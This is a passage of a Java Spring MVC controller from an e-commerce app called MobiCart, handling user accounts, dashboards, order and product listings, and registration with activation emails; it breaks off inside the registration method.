package com.mobicart.web.account;



import java.awt.image.BufferedImage;

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import javax.imageio.ImageIO;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.validation.Valid;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.support.PagedListHolder;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.security.authentication.encoding.PasswordEncoder;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.validation.BindingResult;
import org.springframework.validation.FieldError;
import org.springframework.validation.ObjectError;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import com.mobicart.dao.StateDAO;
import com.mobicart.dao.TerritoryDAO;
import com.mobicart.model.Address;
import com.mobicart.model.App;
import com.mobicart.model.AppColorScheme;
import com.mobicart.model.Billing;
import com.mobicart.model.DiskSpacePricing;
import com.mobicart.model.DiskSpacePricingExample;
import com.mobicart.model.Plans;
import com.mobicart.model.Product;
import com.mobicart.model.ProductFilter;
import com.mobicart.model.ProductOrder;
import com.mobicart.model.SiteConstant;
import com.mobicart.model.StaticPage;
import com.mobicart.model.Store;
import com.mobicart.model.Territory;
import com.mobicart.model.User;
import com.mobicart.service.AdminService;
import com.mobicart.service.AppService;
import com.mobicart.service.LabelService;
import com.mobicart.service.StoreService;
import com.mobicart.service.user.DuplicateUsernameException;
import com.mobicart.service.user.UserService;
import com.mobicart.util.Constants;
import com.mobicart.util.DateTimeUtils;
import com.mobicart.util.EmailGenerator;
import com.mobicart.util.FileUtils;
import com.mobicart.util.ImageSize;
import com.mobicart.util.ImageUtils;
import com.mobicart.util.ImgMagicCmdExcecutor;
import com.mobicart.util.MagicalPower;
import com.mobicart.util.Messages;
import com.mobicart.util.PageUtil;
import com.mobicart.util.Pager;
import com.mobicart.util.PathLocator;
import com.mobicart.util.ResourceProperties;
import com.mobicart.util.Sender;
import com.mobicart.web.app.PaymentForm;


@Controller
@RequestMapping("/account/**")
public class UserController {
	/**
	 * Logger for this class
	 */
	private static final Logger logger = LoggerFactory.getLogger(UserController.class);
	
	@Autowired
    UserService userService;

	@Autowired
	StoreService storeService;

	@Autowired
	AppService appService;
	

	@Autowired 
	PasswordEncoder passwordEncoder;
	
	@Autowired
	Sender sender;
	
	@Autowired
	AdminService adminService;
	
	@Autowired
	LabelService labelService;
	
  
	
	
	
	
	
	private static final String REGISTER_MODEL_KEY = "account/register";
	private static final String LOGIN_VIEW_REDIRECT_KEY = "redirect:/account/login";
	private static final String INDEX_KEY = "account/signup";
	private static final String USER_REGISTER_THANKS_KEY = "account/thanks";
	private static final String MY_ACCOUNT_KEY ="account/personalDetails"; 
	private static final String MY_ACCOUNT_REDIRECT_KEY ="redirect:/account/detail"; 
	private static final String USER_DASHBOARD_KEY ="account/dashboard"; 
	private static final String MORE_PRODUCT_VIEW_KEY ="account/moreProductViews"; 
	private static final String MORE_PRODUCT_ORDER_VIEW_KEY ="account/moreProductOrders"; 
	private static final String PRODUCT_ORDER_DETAIL_VIEW_KEY ="account/productOrderDetails";
	private static final String MORE_SOLD_PRODUCTS_VIEW_KEY ="account/moreSoldProducts"; 
	private static final String MORE_PURCHASED_PRODUCTS_VIEW_KEY ="account/morePurchasedProducts"; 
	private static final String PASSWORD_RESET_VIEW_KEY ="account/passwordReset";
	private static final String PASSWORD_RESET_SUCCESS_VIEW_KEY ="account/passwordResetSuccess";	
	private static final String PASSWORD_FORGOT_VIEW_KEY ="account/passwordForgot";
	private static final String PASSWORD_FORGOT_SEND_VIEW_KEY ="account/passwordForgotSend";
	private static final String PASSWORD_FORGOT_RESET_VIEW_KEY ="account/passwordForgotReset";
	private static final String PASSWORD_FORGOT_SUCCESS_VIEW_KEY ="account/passwordForgotSuccess";
	private static final String USER_ADMIN_REDIRECT_VIEW="redirect:/admin/users";
	private static final String USER_DASHBOARD_REDIRECT_VIEW="redirect:/account/dashboard";
	private static final String GENERATE_API_KEY ="generate/api";
	public static final String ERROR_VIEW = "error";
	
	

	
	
	/**
	 * Show User Account Settings
	 * 
	 * @param registerForm
	 * @param result
	 * @param modelMap
	 * @return
	 */
	@RequestMapping("home")
	public String myAccount(@ModelAttribute RegisterForm registerForm,
			BindingResult result, ModelMap modelMap,
			final HttpServletRequest request, final HttpSession session) {

		Collection<GrantedAuthority> authorities = SecurityContextHolder
				.getContext().getAuthentication().getAuthorities();
		
		
		
		if (authorities.toString().equals("[ROLE_ADMIN]")) {
			// redirect to admin
			return USER_ADMIN_REDIRECT_VIEW;
		}

		String userName = SecurityContextHolder.getContext()
				.getAuthentication().getName();
			
		
		User user = null;
		Store store = null;
		try {
			user = userService.findByEmail(userName);
			
			 if(!user.isEnabled()){
			
			modelMap.put("","");
			return USER_REGISTER_THANKS_KEY;
		      } 

			
			Long userid=user.getId();
			session.setAttribute("user", user);
			
			Plans plans=userService.findServicesByUserId(userid);
			session.setAttribute("plans", plans);
			 
			
			try{
			store = storeService.findStoreByUserId(user.getId());
			user = labelService.setDefaultLabelKeyValuesInUser(user);
			
			}catch (Exception e) {
				logger.error("error in home",e);
			}


			if(logger.isDebugEnabled())logger.debug("finding store {}",store);
			
		if (store != null) {
			session.setAttribute("store", store);
		} else {
			store = new Store();
			store.setUserId(userid);
			store.setdCreatedOn(DateTimeUtils.getCurrentTimestamp());
			store.setsCurrency("US-USD");
			Long id = storeService.createStore(store);
			
			if(logger.isDebugEnabled())logger.debug("creating store {}",store);
			
			store.setId(id);
			session.setAttribute("store", store);
		}

		
		
		App app = null;
		try{
			app = appService.findAppByUser(user);
		}catch (Exception e) {
			logger.error("error in home",e);
		}
		if(logger.isDebugEnabled())logger.debug("finding app {}",app);
		
		if (app != null) {
			session.setAttribute("app", app);
		} else {
			
			if(logger.isDebugEnabled())logger.debug("creating new app ...");
			try{
				
			app=appService.createApp(userid);
			 
			}
			catch (Exception e) {e.printStackTrace();
				// TODO: handle exception
			}
			if(logger.isDebugEnabled())logger.debug("created app {}",app);
		
			// select default colorscheme
			AppColorScheme appColorScheme = new AppColorScheme();
			appColorScheme.setAppId(app.getId());
			appColorScheme.setColorSchemeId(1l);
			appService.saveAppColorScheme(appColorScheme);

			// select deafault features
			Long[] featureIds = { 1L, 2L, 3L, 4L, 5L };
			List<Long> featureIdList = Arrays.asList(featureIds);
			appService.saveAppFeatures(app.getId(), featureIdList);

			//

			List<StaticPage> pages = appService.findStaticPageByUser(userid);
			if (!(pages.size() > 0)) {
				// create static pages
				List<StaticPage> staticPages = PageUtil.getStaticPagesToFeed(
						userid, app.getId());
				appService.saveIntialStaticPages(staticPages);
			}
			request.getSession().setAttribute("app", app);

		}
		
		} catch (Exception e) {
			logger.error("error in home",e);
			return USER_DASHBOARD_REDIRECT_VIEW;
		}

		String cookieName = "old_user_" + user.getId();
		Cookie[] cookies = request.getCookies();
		boolean bOldUser = false;
		for (Cookie cookie : cookies) {
			if (cookie.getName().equals(cookieName)) {
				if (cookie.getValue().equals("true")) {
					bOldUser = true;
				}
			}
		}

		if (bOldUser) {
			return USER_DASHBOARD_REDIRECT_VIEW;
		} else {
			return MY_ACCOUNT_REDIRECT_KEY;
		}
	}
	
	
	/**
	 * User Dashboard view
	 * 
	 * @return path to views/account/dashboard.jsp
	 */
	@SuppressWarnings("unchecked")
	@RequestMapping("dashboard")
	public String dashboard(HttpServletRequest request, ModelMap modelMap) {
		List<ProductOrder> orders = null;
		List<Product> products = null;
		List<Product> boughtProducts = null;
		List<Product> soldProducts = null;
		try {
			int DASHBOARD_LIMIT = 5;
			User user = (User) request.getSession().getAttribute("user");
			Store store = (Store) request.getSession().getAttribute("store");
			
			App app = appService.findAppByUser(user);
			orders = userService.findProductOrders(user.getId());
			
			ProductFilter productFilter = new ProductFilter();

			if(app!=null){
			// views
				productFilter.setAppId(app.getId());
				int maxLimit=user.getStoreProductLimit();
				if(maxLimit<5)
				productFilter.setMaxResults(maxLimit);
				else
					productFilter.setMaxResults(5);
				
				products = storeService.findProductsByFilter(productFilter);
			}
			// sold out/purchased
			productFilter.setMaxResults(1000);
			
			Pager pager=new Pager();
			pager.setResults(10);
			List<Product> purchasedProducts = storeService
					.findPurchasedProductsWithPagination(user.getId(),pager);

			boughtProducts = new ArrayList<Product>();

			if (purchasedProducts != null)
				for (Product product : purchasedProducts) {
						if (boughtProducts.size() <= DASHBOARD_LIMIT)
							boughtProducts.add(product);

				}
			
			pager.setPage(0);
			pager.setResults(10);
			pager.setSortBy("id");
			pager.setSortOrder("DESC");
			pager.setKeyword("");
			//get result Map
			Map<String,Object> resultMap = storeService.findStoreProductsWithPagination(store.getId(),pager);
			//get products
			soldProducts =(List<Product>) resultMap.get("productList");

			
			if (soldProducts.size() > 0)
				Collections.sort(soldProducts, Product.AGGREGATE_QUANTITY_ORDER);
			if (boughtProducts.size() > 0)
				Collections.sort(boughtProducts, Collections
						.reverseOrder(Product.SHIPPED_QUANTITY_ORDER));


		}catch(NullPointerException ne){
			logger.error("something is null at dashboard "+ne.getMessage());
			return "redirect:/account/login";
		}
		catch (Exception e) {
			logger.error("error in geting data for dashboard  {}",e.getLocalizedMessage());
		}

		modelMap.put("productOrders", orders);
		modelMap.put("products", products);
		modelMap.put("soldProducts", soldProducts);
		modelMap.put("boughtProducts", boughtProducts);

		
		return USER_DASHBOARD_KEY;
	}	
	
	
	/**
	 * More product orders
	 * @return path to views/account/dashboard.jsp
	 */
	@SuppressWarnings({ "unchecked", "rawtypes" })
	@RequestMapping("product/orders")
	public String moreProductViews(HttpServletRequest request,ModelMap modelMap) {
		User user=(User)request.getSession().getAttribute("user");
		Integer totalProductOrders = (Integer)request.getSession(false).getAttribute("totalProductOrders");
		/** ****************BEGIN PAGER CODE**************** */
		Integer offSet = (request.getParameter("member.offset") == null)? 0 : Integer.parseInt((request.getParameter("member.offset").toString()));
		/** ****************END PAGER CODE**************** */
		
		Pager pager = new Pager();
		pager.setPage(offSet);
		pager.setResults(25);
		
		try{
			List<ProductOrder> pagedListHolder = (List<ProductOrder>) request.getSession().getAttribute("productOrderList");
			
			if(pagedListHolder == null){
	            pagedListHolder = userService.findProductOrdersWithPaging(user.getId(), pager);
	        }
			if(totalProductOrders == null)
				totalProductOrders = userService.findProductOrdersCountByUser(user.getId());
			
			//List<ProductOrder> productOrders=userService.findProductOrdersWithPaging(user.getId(), pager);
			
			
			//TODO: Write a method that find the total count of the results based on query used in ths method storeService.findProductsByStore(store.getId(),pager);
			//Integer totalOrders = userService.findProductOrdersCountByUser(user.getId());

			/*PagedListHolder<List<ProductOrder>> pagedListHolder = (PagedListHolder<List<ProductOrder>>) request.getSession().getAttribute("productOrderList");

        if(pagedListHolder == null){
            pagedListHolder = new PagedListHolder(userService.findProductOrders(user.getId()));
        }
        else{
        	pagedListHolder.setPageSize(25);
        	String page = (String) request.getParameter("page");
            if("next".equals(page)){
                pagedListHolder.nextPage();
           }
            else if("previous".equals(page)){
                pagedListHolder.previousPage();
            }else{
            	try{
            	int pageNumber=Integer.parseInt(page);
            		pagedListHolder.setPage(pageNumber);
            	}catch(Exception e){
            		//kuch na kar
            	}
            }
        }*/

		request.getSession().setAttribute("totalProductOrders", totalProductOrders);
        //request.getSession().setAttribute("productOrderList", pagedListHolder);
        modelMap.put("productOrderList", pagedListHolder);

		}catch(Exception e){
			logger.error("error in featching all orders",e);
		}
		
		
		
		return MORE_PRODUCT_ORDER_VIEW_KEY;
	}
	
	
	/**
	 * Personal Details
	 * @param registerForm
	 * @param result
	 * @param modelMap
	 * @param request
	 * @param session
	 * @return
	 */
	
	@RequestMapping("detail")
	public String myPersonalDetail(@ModelAttribute RegisterForm registerForm,@ModelAttribute PaymentForm paymentForm,
			BindingResult result, ModelMap modelMap,
			final HttpServletRequest request, final HttpSession session) {
		
		User user = (User) session.getAttribute("user");
		
		String tabSelected=request.getParameter("tabSelected");
		modelMap.put("tabSelected", tabSelected);
		
		try {
			if (user != null) {
				registerForm.setFirstName(user.getsFirstName());
				registerForm.setLastName(user.getsLastName());
				registerForm.setUsername(user.getUsername());
				registerForm.setHeardFrom(user.getsHeardFrom());
				registerForm.setCompanyRegNo(user.getsCompanyRegNo());
				registerForm.setTaxRegNo(user.getsTaxRegNo());
				registerForm.setCompanyLogo(user.getsCompanyLogo());
				registerForm.setCustomDomainName(user.getsWebappDomainName());
				registerForm.setPhoneNo(user.getPhoneNo());
				registerForm.setOrderReturnUrl(user.getOrderReturnUrl());
				
				Address address = userService.findAddressByUserId(user.getId());
				if (address != null) {
					registerForm.setAddress(address.getsAddress());
					registerForm.setCity(address.getsCity());
					registerForm.setState(address.getsState());
					registerForm.setCountry(address.getsCountry());
					registerForm.setZip(address.getsZip());
				}
			}

			
		} catch (Exception e) {
			logger.error("user is null {} ",e.getLocalizedMessage());
		}

		modelMap.put("registerForm", registerForm);
		List<Territory> countries = appService.findAllTerritories();
		modelMap.put("countries", countries);

		try{
		List<Billing> billingDetails = userService.findBillingDetails(user
				.getId());
		modelMap.put("billingDetails", billingDetails);
		}catch (Exception e) {
			logger.info("fetching billing details {}",e.getLocalizedMessage());
		}
		
		String apiKey = userService.findUserAPIKey(user.getId());
		modelMap.put("apiKey", apiKey);
		
		SiteConstant siteConstant=adminService.findSiteConstants();
		
		List<DiskSpacePricing> diskSpacePricingList=null;
		
		try{
			diskSpacePricingList=userService.findDiskSpacePricingByExample(new DiskSpacePricingExample());
		}catch(Exception e){
			logger.info("diskSpacePricing Fetching",e);
		}
		
		modelMap.put("diskSpacePricingList", diskSpacePricingList);
		
		/*if(diskSpacePricingList !=null && diskSpacePricingList.size() > 0){
			for(DiskSpacePricing diskSpacePricing: diskSpacePricingList){

				modelMap.put("", arg1);
				
			}
			
		}*/
		
		modelMap.put("brandingRemovalAmount",siteConstant.getfRemoveBrandingFee());
		

		if (user != null) {
			try {
				App app = appService.findAppByUser(user);

				List<Territory> countriesForApp = appService
						.findAppTerritories(app.getId());
				modelMap.put("countriesForApp", countriesForApp);
			} catch (Exception e) {
				logger.error("myPersonalDetail errror {}", e.getLocalizedMessage());
				return LOGIN_VIEW_REDIRECT_KEY;
			}
		}

		String tabSelect=request.getParameter("tabSelect");
		
		if(tabSelect !=null && !"".equals(tabSelect)){
		modelMap.put("tabSelect", tabSelect);	
		}else{
		modelMap.put("tabSelect", 0);
		}
		
		return MY_ACCOUNT_KEY;

	}	
	
	
	/**
	 * Send forgot password reset email to user
	 * @param registerForm
	 * @param result
	 * @param username
	 * @param modelMap
	 * @return path to views/passwordForgotSend.jsp
	 */
	@RequestMapping(value = GENERATE_API_KEY,method = RequestMethod.POST) 
	public String generateAPIKey(@ModelAttribute RegisterForm registerForm,
			BindingResult result, ModelMap modelMap,
			final HttpServletRequest request, final HttpSession session){
			return PASSWORD_FORGOT_SEND_VIEW_KEY;
	}
	
	
	/**
	 *  product orders details
	 * @return path to views/account/dashboard.jsp
	 */
	@RequestMapping(value = "/product/orders/{orderId}/details", method = RequestMethod.GET)
	public String productOrderDetails(@PathVariable("orderId") Long orderId,HttpServletRequest request,ModelMap modelMap) {
		 
		ProductOrder productOrder=storeService.findProductOrder(orderId);
		Store store=(Store)request.getSession().getAttribute("store");
		try{
			//check user ownership		
			if(!String.valueOf(store.getId()).equalsIgnoreCase(String.valueOf(productOrder.getStoreId()))){
				throw new AccessDeniedException("You do not have authority to accomplish this.");
		}
			
		modelMap.put("productOrder", productOrder);
		return PRODUCT_ORDER_DETAIL_VIEW_KEY;
		}catch(Exception e){
			 e.printStackTrace();
			return USER_DASHBOARD_REDIRECT_VIEW;
		}
	}
	
	
	
	/**
	 * save product order details
	 * @return path to views/account/dashboard.jsp
	 */
	@RequestMapping(value = "product/order/save", method = RequestMethod.POST)
	public String productOrderDetailsSave(@ModelAttribute ProductOrder productOrder,BindingResult result,HttpServletRequest request,ModelMap modelMap) {
		storeService.updateProductOrder(productOrder);
		productOrder=storeService.findProductOrder(productOrder.getId());
		modelMap.put("productOrder", productOrder);
		modelMap.put("success", Messages.USER_PRODUCT_ORDER_UPDATE);
		return PRODUCT_ORDER_DETAIL_VIEW_KEY;
	}
	
	
	
	
	/**
	 * More product views
	 * @return path to views/account/dashboard.jsp
	 */
	@SuppressWarnings({ "unchecked", "rawtypes" })
	@RequestMapping("product/views")
	public String moreProductOrders(HttpServletRequest request,ModelMap modelMap) {
		User user=(User)request.getSession().getAttribute("user");
		Integer appProducts = (Integer)request.getSession(false).getAttribute("totalViewedProducts");
		App app=null;
		try {
			app = appService.findAppByUser(user);
		} catch (SQLException e) {
			logger.error("Cound not find app ",e);
		}
		
		/** ****************BEGIN PAGER CODE**************** */
		Integer offSet = (request.getParameter("member.offset") == null)? 0 : Integer.parseInt((request.getParameter("member.offset").toString()));
		/** ****************END PAGER CODE**************** */
		
		Pager pager = new Pager();
		pager.setPage(offSet);
		
		int maxPlroductLimit=user.getStoreProductLimit();
		if(maxPlroductLimit<25)
		pager.setResults(maxPlroductLimit);
		else
		pager.setResults(25);
		 
		
		if(app!=null){
		List<Product> products =storeService.findProductsByAppWithPaging(app.getId(), pager);

		if(appProducts == null)
			appProducts = storeService.findProductCountByApp(app.getId());
		
		if(maxPlroductLimit<appProducts)
			appProducts=new Integer(maxPlroductLimit);
	
		//modelMap.put("products", products);
		
		//List<Product> pagedListHolder = (List<Product>) request.getSession().getAttribute("productList");

        /*if(pagedListHolder == null){
            pagedListHolder = products;
        }*/
        /*else{
        	
        	String page = (String) request.getParameter("page");
            if("next".equals(page)){
                pagedListHolder.nextPage();
           }
            else if("previous".equals(page)){
                pagedListHolder.previousPage();
            }else{
            	try{
            	int pageNumber=Integer.parseInt(page);
            		pagedListHolder.setPage(pageNumber);
            	}catch(Exception e){
            		//kuch na kar
            	}
            }
             
        }*/
		
        //request.getSession().setAttribute("productList", pagedListHolder);
        request.getSession().setAttribute("totalViewedProducts", appProducts);
        //modelMap.put("productList", pagedListHolder);
        modelMap.put("productList", products);
        
		}else{
			modelMap.put("productList", null);
			
		}
        
		return MORE_PRODUCT_VIEW_KEY;
	}
	

	
	
	/**
	 * More product views
	 * @return path to views/account/dashboard.jsp
	 */
	@SuppressWarnings({ "unused", "unchecked", "rawtypes" })
	@RequestMapping("products/sold")
	public String moreSolOutProduct(HttpServletRequest request,ModelMap modelMap) {
		Store store=(Store)request.getSession().getAttribute("store");
		Integer totalProducts = (Integer)request.getSession(false).getAttribute("totalSoldProducts");
		/** ****************BEGIN PAGER CODE**************** */
		Integer offSet = (request.getParameter("member.offset") == null)? 0 : Integer.parseInt((request.getParameter("member.offset").toString()));
		/** ****************END PAGER CODE**************** */
		
		Pager pager = new Pager();
		pager.setPage(offSet);
		pager.setResults(25);
		
		try{
			
		//sold products
		List<Product> soldProducts=storeService.findProductsByStore(store.getId(),pager);
		
		if (soldProducts.size() > 0)
			Collections.sort(soldProducts, Product.AGGREGATE_QUANTITY_ORDER);
		
		//TODO: Write a method that find the total count of the results based on query used in ths method storeService.findProductsByStore(store.getId(),pager);
		
		if(totalProducts == null)
			totalProducts = storeService.findProductCountByStore(store.getId());
		
	/*	PagedListHolder<List<Product>> pagedListHolder = (PagedListHolder<List<Product>>)new PagedListHolder(soldProducts);//request.getSession().getAttribute("soldProducts");

        if(pagedListHolder == null){
        	
            pagedListHolder = new PagedListHolder(soldProducts);
        }
        else{
        	String page = (String) request.getParameter("page");
            if("next".equals(page)){
                pagedListHolder.nextPage();
           }
            else if("previous".equals(page)){
                pagedListHolder.previousPage();
            }else{
            	try{
            	int pageNumber=Integer.parseInt(page);
            		pagedListHolder.setPage(pageNumber);
            	}catch(Exception e){
            	//	e.printStackTrace();
            	}
            }
             
        }*/
		
		
		request.getSession().setAttribute("totalSoldProducts", totalProducts);
        //request.getSession().setAttribute("soldProducts", soldProducts);
        modelMap.put("soldProducts", soldProducts);
		}catch(Exception e){
			logger.error("Could not find more sold prdoucts ",e);
			}
		return MORE_SOLD_PRODUCTS_VIEW_KEY;
	}
	
	
	
	
	

	/**
	 * More product views
	 * @return path to views/account/dashboard.jsp
	 
	@SuppressWarnings({ "unchecked", "rawtypes" })
	@RequestMapping("products/purchased")
	public String morePurchasedProduct(HttpServletRequest request,ModelMap modelMap) {
		
		User user=(User)request.getSession().getAttribute("user");
		
		
		
		
		try{
		List<Product> boughtProducts =storeService.findPurchasedProducts(user.getId());
		
		if(boughtProducts.size()>0)
			Collections.sort(boughtProducts,Collections.reverseOrder(Product.SHIPPED_QUANTITY_ORDER));
		
		PagedListHolder<List<Product>> pagedListHolder = (PagedListHolder<List<Product>>) request.getSession().getAttribute("boughtProducts");

        if(pagedListHolder == null){
            pagedListHolder = new PagedListHolder(boughtProducts);
        }
        else{
        	
        	String page = (String) request.getParameter("page");
            if("next".equals(page)){
                pagedListHolder.nextPage();
           }
            else if("previous".equals(page)){
                pagedListHolder.previousPage();
            }else{
            	try{
            	int pageNumber=Integer.parseInt(page);
            		pagedListHolder.setPage(pageNumber);
            	}catch(Exception e){
            	}
            }
        }
        request.getSession().setAttribute("boughtProducts", pagedListHolder);
        modelMap.put("boughtProducts", pagedListHolder);
		}catch(Exception e){
			logger.error("cound not find more purchased products",e);
			}	
		return MORE_PURCHASED_PRODUCTS_VIEW_KEY;
	}

	*/
	
	
	
	
	/**
	 * More product views
	 * @return path to views/account/dashboard.jsp
	 */
	@SuppressWarnings({ "unchecked", "rawtypes" })
	@RequestMapping("products/purchased")
	public String morePurchasedProduct(HttpServletRequest request,ModelMap modelMap) {
		User user=(User)request.getSession().getAttribute("user");
		Store store = (Store)request.getSession().getAttribute("store");
		Integer totalProducts = (Integer)request.getSession(false).getAttribute("totalSoldProducts");
		/** ****************BEGIN PAGER CODE**************** */
		Integer offSet = (request.getParameter("member.offset") == null)? 0 : Integer.parseInt((request.getParameter("member.offset").toString()));
		/** ****************END PAGER CODE**************** */
		
		Pager pager = new Pager();
		pager.setPage(offSet);
		pager.setResults(25);
		
		try{
			
		//sold products
		List<Product> boughtProducts=storeService.selectPurchasedProductsWithPaging(user.getId(), pager);
		
		if(boughtProducts.size()>0)
			Collections.sort(boughtProducts,Collections.reverseOrder(Product.SHIPPED_QUANTITY_ORDER));
		
		//TODO: Write a method that find the total count of the results based on query used in ths method storeService.findProductsByStore(store.getId(),pager);
		
		if(totalProducts == null){
			totalProducts = storeService.findProductCountByStore(store.getId());
		}
	/*	PagedListHolder<List<Product>> pagedListHolder = (PagedListHolder<List<Product>>)new PagedListHolder(soldProducts);//request.getSession().getAttribute("soldProducts");

        if(pagedListHolder == null){
        	
            pagedListHolder = new PagedListHolder(soldProducts);
        }
        else{
        	String page = (String) request.getParameter("page");
            if("next".equals(page)){
                pagedListHolder.nextPage();
           }
            else if("previous".equals(page)){
                pagedListHolder.previousPage();
            }else{
            	try{
            	int pageNumber=Integer.parseInt(page);
            		pagedListHolder.setPage(pageNumber);
            	}catch(Exception e){
            	//	e.printStackTrace();
            	}
            }
             
        }*/
		
		
		request.getSession().setAttribute("totalPurchasedProducts", totalProducts);
        //request.getSession().setAttribute("soldProducts", soldProducts);
        modelMap.put("boughtProducts", boughtProducts);
		}catch(Exception e){
			logger.error("Could not find more sold prdoucts ",e);
			}
		return MORE_PURCHASED_PRODUCTS_VIEW_KEY;
	}
	
	
	
	
	/**
	 * User login view
	 * @return path to views/login.jsp
	 */
	@RequestMapping("login")
	public String login(ModelMap modelMap,HttpServletRequest request) throws Exception{
		
		User user=(User)request.getSession().getAttribute("user");
		
		
			
		
		return "login";
	}

	
	/**
	 * Show registration view
	 * @param registerForm
	 * @param result
	 * @param modelMap
	 * @return path to views/index.jsp
	 */
	@RequestMapping(value = "register",method = RequestMethod.GET) 
	public String register(@ModelAttribute RegisterForm registerForm,BindingResult result,ModelMap modelMap){
		return REGISTER_MODEL_KEY;
	}
	
	
	/**
	 * register user and send activation mail
	 * @param registerForm
	 * @param result
	 * @param challenge
	 * @param response
	 * @param request
	 * @param modelMap
	 * @return redirect to user dashboard if successfull, else who validation messages on front screen 
	 */
	@RequestMapping(value = "user/dashboard",method = RequestMethod.POST) 
	public String showDashboard(@ModelAttribute @Valid RegisterForm registerForm,BindingResult result,@RequestParam(value="recaptcha_challenge_field",required=false) String challenge,
	        @RequestParam(value="recaptcha_response_field",required=false) String response,@RequestParam(value="signup-landing",required=false) String signupLanding,HttpServletRequest request,ModelMap modelMap)
	{

		modelMap.addAttribute("tabSelect", "3");
	 
	 
		
		if(result.hasErrors()){
				result.reject("Error.registerForm.common", "Some error occured in registration process.");
				if(signupLanding.equals("register")){
					return REGISTER_MODEL_KEY;	
				}else{
					return INDEX_KEY;
			}
				
				
		 }else{
			 try {
				registerForm.setEnabled(false);
				UUID idOne = UUID.randomUUID(); 
				String authKey = idOne.toString();
				registerForm.setAuthKey(authKey);
				//create user
				User newUser = userService.create(registerForm);
				
				if(newUser != null){
					//Code to send the authentication email to registering user
			        EmailGenerator email = new EmailGenerator();
			        email.setFromEmail(ResourceProperties.getString("adminEmail"));
			        email.setToEmail(registerForm.getUsername());
			        email.setSubject("MobiCart - Confirmation needed");
			        PathLocator path = new PathLocator();

			        email.setTemplateName(path.getRealPath() + "emailTemplate/REGISTERING_USER_AUTHENTICATION");

			        HashMap<String, String> param = new HashMap<String, String>();
			        
			        String name="";
			        name=registerForm.getFirstName()!=null?registerForm.getFirstName():"" +
			        		registerForm.getLastName()!=null? " "+ registerForm.getLastName():" ";
			        param.put("_NAME_",name);
			        param.put("_BASEPATH_", ResourceProperties.getString("appUrl"));
			        param.put("_ACTIVATIONLINK_", ResourceProperties.getString("appUrl")+"/account/verify?authKey="+authKey.trim());
			        email.setParam(param);

			        sender.sendMail(email);
					
					//create store
					Store newStore=new Store();
					newStore.setsSName(registerForm.getStoreName());
					newStore.setUserId(newUser.getId());
					newStore.setbEnabled(true);
					storeService.createStore(newStore);
			
					modelMap.put("userId", newUser.getId());
				}
				
			 } catch (DuplicateUsernameException e) {
				 logger.error("Duplicate username erorr"+e.getMessage());
				 result.reject("Duplicate.registerForm.username", "This email address is already being used.");
				if(signupLanding.equals("register")){
					return REGISTER_MODEL_KEY;	
				}else{
					return INDEX_KEY;
					}
				
			}catch (Exception e) {
				logger.error("some error occured in registration",e);
				result.reject("Error.registerForm.common", "Some error occured in registration process : "+e.getLocalizedMessage());
				if(signupLanding.equals("register")){
					return REGISTER_MODEL_KEY;	
				}else{
					return INDEX_KEY;
					}
				
			}
			
			
			 return USER_REGISTER_THANKS_KEY;
		 }
		
	}
	/**
	 * register user and send activation mail
	 * @param registerForm
	 * @param result
	 * @param challenge
	 * @param response
	 * @param request
	 * @param modelMap
	 * @return redirect to user dashboard if successfull, else who validation messages on front screen 
	 */
	@RequestMapping(value = "user/registeruser",method = RequestMethod.POST) 
	public String registerUser(@ModelAttribute @Valid RegisterForm registerForm,BindingResult result,@RequestParam(value="recaptcha_challenge_field",required=false) String challenge,
	        @RequestParam(value="recaptcha_response_field",required=false) String response,@RequestParam(value="signup-landing",required=false) String signupLanding,HttpServletRequest request,HttpServletResponse httpresponse,ModelMap modelMap)
	{

		modelMap.addAttribute("tabSelect", "3");
	   StringBuilder errorMsg=new StringBuilder();
	   StringBuilder sucessrMsg=new StringBuilder();
	   User newUser=null;
		
		if(result.hasErrors()){
				result.reject("Error.registerForm.common", "Some error occured in registration process.");
						
		 }else{
			 try {
				registerForm.setEnabled(false);
				UUID idOne = UUID.randomUUID(); 
				String authKey = idOne.toString();
				registerForm.setAuthKey(authKey);
				//create user
				  newUser = userService.create(registerForm);
				
				if(newUser != null){
					//Code to send the authentication email to registering user
			        EmailGenerator email = new EmailGenerator();
			        email.setFromEmail(ResourceProperties.getString("adminEmail"));
			        email.setToEmail(registerForm.getUsername());
			        email.setSubject("MobiCart - Confirmation needed");
			        PathLocator path = new PathLocator();

			        email.setTemplateName(path.getRealPath() + "emailTemplate/REGISTERING_USER_AUTHENTICATION");

			        HashMap<String, String> param = new HashMap<String, String>();
			        
			        String name="";
			        name=registerForm.getFirstName()!=null?registerForm.getFirstName():"" +
			        		registerForm.getLastName()!=null? " "+ registerForm.getLastName():" ";
			        param.put("_NAME_",name);
			        param.put("_BASEPATH_", ResourceProperties.getString("appUrl"));
			        param.put("_ACTIVATIONLINK_", ResourceProperties.getString("appUrl")+"/account/verify?authKey="+authKey.trim());
			        email.setParam(param);

			        sender.sendMail(email);
					
					//create store
					Store newStore=new Store();
					newStore.setsSName(registerForm.getStoreName());
					newStore.setUserId(newUser.getId());
					newStore.setbEnabled(true);
					storeService.createStore(newStore);
					sucessrMsg.append("success");
					//modelMap.put("userId", newUser.getId());
				}
				
			 } catch (DuplicateUsernameException e) {
				 logger.error("Duplicate username erorr"+e.getMessage());
				 result.reject("Duplicate.registerForm.username", "This email address is already being used.");
				 
				
			}catch (Exception e) {
				logger.error("some error occured in registration",e);
				result.reject("Error.registerForm.common", "Some error occured in registration process : "+e.getLocalizedMessage());
				 
				
			}
			
			
			 
		 }
		
		try{
			
			List<ObjectError> Obgerrors=result.getAllErrors();		 
			List<FieldError> ferrors= result.getFieldErrors();
